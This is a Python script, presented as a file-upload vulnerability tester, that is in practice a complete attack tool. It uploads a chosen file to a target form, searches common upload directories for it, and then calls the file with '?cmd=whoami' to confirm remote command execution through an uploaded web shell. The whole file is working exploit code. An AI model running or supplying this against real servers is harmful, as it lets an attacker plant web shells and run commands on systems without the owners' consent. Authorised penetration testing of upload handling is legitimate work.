import requests
import argparse
from urllib.parse import urljoin

COMMON_PATHS = [
    "uploads/", "upload/", "files/", "userfiles/", "assets/", "images/"
]

def upload_file(target_url, file_path, field_name):
    with open(file_path, 'rb') as f:
        files = {field_name: f}
        try:
            res = requests.post(target_url, files=files)
            print(f"[+] Upload response status: {res.status_code}")
            return res.status_code == 200
        except Exception as e:
            print(f"[!] Upload failed: {e}")
            return False

def check_file(base_url, filename):
    for path in COMMON_PATHS:
        check_url = urljoin(base_url, path + filename)
        try:
            res = requests.get(check_url)
            if res.status_code == 200:
                print(f"[✓] File accessible at: {check_url}")
                # Attempt RCE
                try:
                    rce_url = f"{check_url}?cmd=whoami"
                    rce_res = requests.get(rce_url)
                    print("[RCE Output]")
                    print(rce_res.text.strip())
                except:
                    print("[!] RCE check failed.")
                return True
        except:
            continue
    print("[-] File not found in common paths.")
    return False

def main():
    parser = argparse.ArgumentParser(description="File Upload Vulnerability Tester")
    parser.add_argument('target_url', help='Upload form URL')
    parser.add_argument('file_path', help='File to upload')
    parser.add_argument('--base', help='Base URL for checking file path', required=True)
    parser.add_argument('--field', help='Field name of upload form', default='upload')
    args = parser.parse_args()

    filename = args.file_path.split('/')[-1]
    if upload_file(args.target_url, args.file_path, args.field):
        check_file(args.base, filename)

if __name__ == '__main__':
    main()
